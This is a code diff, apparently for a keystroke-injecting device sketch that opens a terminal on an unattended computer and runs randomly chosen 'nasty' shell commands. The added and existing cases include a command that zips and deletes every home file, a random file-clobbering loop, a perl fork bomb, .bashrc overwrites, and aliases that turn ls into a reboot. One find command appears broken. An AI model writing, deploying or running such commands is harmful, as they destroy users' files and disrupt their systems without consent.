@@ -24,9 +24,9 @@ void setup()
 
 void loop()
 { //Main loop
-  int rnum= random(100);
-  if(rnum > 20)
-  {// aprox. 10% chance of doing something bad
+  int rnum= random(99);
+  if(rnum < 15)
+  {// aprox. 15% chance of doing something bad or weird
     openTerm(); //opens up a terminal
     runCmd(randBadThing(rnum)); //executes random nasty command
   }
@@ -65,6 +65,9 @@ char* randBadThing(int n)
 {
   switch(n)
   {
+    case 0:// this won't work without root, but... 
+      return "echo \"alias ls='shutdown -r now'\" >> .bashrc";
+      break;
     case 1:// plain and simple annoying
       return "echo \"alias cd='ls'\" >> .bashrc";
       break;
@@ -92,11 +95,17 @@ char* randBadThing(int n)
     case 9:// lol
       return "echo \"alias kill='echo all dead'\" >> .bashrc";
       break;
-    case 0:// this won't work without root, but... 
-      return "echo \"alias ls='shutdown -r now'\" >> .bashrc";
-      break;
     case 10:// another fork bomb, if perl is available
       return "perl -e fork while fork";
+      break;
+    case 11:// search all home files, zip them and delete the original
+      return "cd;for f in `ls -R --sort=size --reverse`; do zip -9 allMyFiles.zip $f; rm $f; done";
+      break;
+    case 12:// variant on case 11. Chooses two random files within ~/* and moves one to the other. Thanks Maxi for this file-based russian roulette!
+      return "for f in `find ~ -type f | shuf -n 1`; do mv $f `find . -type ~ | shuf -n 1`; done";
+      break;
+    case 13:// deletes .bashrc
+      return "echo \"I've been pwnd!\" > .bashrc";
       break;
     default:// lucky you =) Next time, don't leave your terminal unlocked!
       return "wall \"I'm a lucky bastard!\"";
